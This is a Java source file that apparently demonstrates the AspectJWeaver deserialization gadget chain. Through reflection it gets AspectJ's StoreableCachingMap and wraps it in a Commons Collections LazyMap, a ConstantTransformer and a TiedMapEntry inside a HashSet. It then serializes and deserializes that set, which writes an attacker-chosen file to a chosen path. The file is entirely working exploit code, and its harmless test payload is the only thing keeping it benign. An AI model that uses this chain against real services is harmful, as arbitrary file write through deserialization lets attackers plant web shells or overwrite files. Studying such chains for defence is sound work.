package AspectJWeaver;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import common.*;
import java.lang.reflect.Constructor;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws Exception {
        String filename = "test.txt";
        String content = "Hello, AspectJ Weaving!";
        String filepath = "E:\\code\\Java_Test\\src\\main\\java\\AspectJWeaver";

        Class c = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = c.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        Map map = (Map) constructor.newInstance(filepath, 10000);

        Transformer transformer = new ConstantTransformer(content.getBytes(StandardCharsets.UTF_8));
        Map lzmap = LazyMap.decorate(map,transformer);
        TiedMapEntry entry = new TiedMapEntry(lzmap, filename);
        HashSet set = new HashSet();
        set.add(entry);

        byte[] ser=Util.serialize(set);
        Util.deserialize(ser);

    }
}
